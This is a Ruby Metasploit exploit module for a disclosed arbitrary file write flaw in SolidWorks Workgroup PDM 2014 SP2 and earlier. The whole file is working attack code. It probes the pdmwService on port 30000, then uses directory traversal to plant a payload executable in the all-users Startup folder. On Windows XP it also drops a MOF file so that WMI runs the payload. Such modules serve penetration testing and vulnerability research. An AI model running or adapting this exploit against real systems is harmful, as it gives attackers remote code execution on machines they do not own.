 
class Metasploit3 < Msf::Exploit::Remote
  Rank = GoodRanking
 
  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::EXE
  include Msf::Exploit::WbemExec
  include Msf::Exploit::FileDropper
 
  def initialize(info = {})
    super(update_info(
      info,
      &#039;Name&#039;           => &#039;SolidWorks Workgroup PDM 2014 pdmwService.exe Arbitrary File Write&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a remote arbitrary file write vulnerability in
        SolidWorks Workgroup PDM 2014 SP2 and prior.
 
        For targets running Windows Vista or newer the payload is written to the
        startup folder for all users and executed upon next user logon.
 
        For targets before Windows Vista code execution can be achieved by first
        uploading the payload as an exe file, and then upload another mof file,
        which schedules WMI to execute the uploaded payload.
 
        This module has been tested successfully on SolidWorks Workgroup PDM
        2011 SP0 on Windows XP SP3 (EN) and Windows 7 SP1 (EN).
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Mohamed Shetta <mshetta[at]live.com>&#039;, # Initial discovery and PoC
          &#039;Brendan Coles <bcoles[at]gmail.com>&#039;,  # Metasploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;EDB&#039;,   &#039;31831&#039;],
          [&#039;OSVDB&#039;, &#039;103671&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039;   => "\x00"
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          # Tested on:
          # - SolidWorks Workgroup PDM 2011 SP0 (Windows XP SP3 - EN)
          # - SolidWorks Workgroup PDM 2011 SP0 (Windows 7 SP1 - EN)
          [&#039;Automatic&#039;, { &#039;auto&#039; => true } ], # both
          [&#039;SolidWorks Workgroup PDM <= 2014 SP2 (Windows XP SP0-SP3)&#039;, {}],
          [&#039;SolidWorks Workgroup PDM <= 2014 SP2 (Windows Vista onwards)&#039;, {}],
        ],
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => &#039;Feb 22 2014&#039;,
      &#039;DefaultTarget&#039;  => 0))
 
    register_options([
      OptInt.new(&#039;DEPTH&#039;, [true, &#039;Traversal depth&#039;, 10]),
      Opt::RPORT(30000)
    ], self.class)
  end
 
  def peer
    "#{rhost}:#{rport}"
  end
 
  #
  # Check
  #
  def check
    # op code
    req  = "\xD0\x07\x00\x00"
    # filename length
    req << "\x00\x00\x00\x00"
    # data length
    req << "\x00\x00\x00\x00"
    connect
    sock.put req
    res = sock.get_once
    disconnect
    if !res
      vprint_error "#{peer} - Connection failed."
      Exploit::CheckCode::Unknown
    elsif res == "\x00\x00\x00\x00"
      vprint_status "#{peer} - Received reply (#{res.length} bytes)"
      Exploit::CheckCode::Detected
    else
      vprint_warning "#{peer} - Unexpected reply (#{res.length} bytes)"
      Exploit::CheckCode::Safe
    end
  end
 
  #
  # Send a file
  #
  def upload(fname, data)
    # every character in the filename must be followed by 0x00
    fname = fname.scan(/./).join("\x00") + "\x00"
    # op code
    req  = "\xD0\x07\x00\x00"
    # filename length
    req << "#{[fname.length].pack(&#039;l&#039;)}"
    # file name
    req << "#{fname}"
    # data length
    req << "#{[data.length].pack(&#039;l&#039;)}"
    # data
    req << "#{data}"
    connect
    sock.put req
    res = sock.get_once
    disconnect
    if !res
      fail_with(Failure::Unknown, "#{peer} - Connection failed.")
    elsif res == "\x00\x00\x00\x00"
      print_status "#{peer} - Received reply (#{res.length} bytes)"
    else
      print_warning "#{peer} - Unexpected reply (#{res.length} bytes)"
    end
  end
 
  #
  # Exploit
  #
  def exploit
    depth    = &#039;..\\&#039; * datastore[&#039;DEPTH&#039;]
    exe      = generate_payload_exe
    exe_name = "#{rand_text_alpha(rand(10) + 5)}.exe"
    if target.name =~ /Automatic/ or target.name =~ /Vista/
      print_status("#{peer} - Writing EXE to startup for all users (#{exe.length} bytes)")
      upload("#{depth}\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\#{exe_name}", exe)
    end
    if target.name =~ /Automatic/ or target.name =~ /XP/
      print_status("#{peer} - Sending EXE (#{exe.length} bytes)")
      upload("#{depth}\\WINDOWS\\system32\\#{exe_name}", exe)
      mof_name = "#{rand_text_alpha(rand(10) + 5)}.mof"
      mof      = generate_mof(::File.basename(mof_name), ::File.basename(exe_name))
      print_status("#{peer} - Sending MOF (#{mof.length} bytes)")
      upload("#{depth}\\WINDOWS\\system32\\wbem\\mof\\#{mof_name}", mof)
      register_file_for_cleanup("wbem\\mof\\good\\#{::File.basename(mof_name)}")
    end
    register_file_for_cleanup("#{::File.basename(exe_name)}")
  end
end

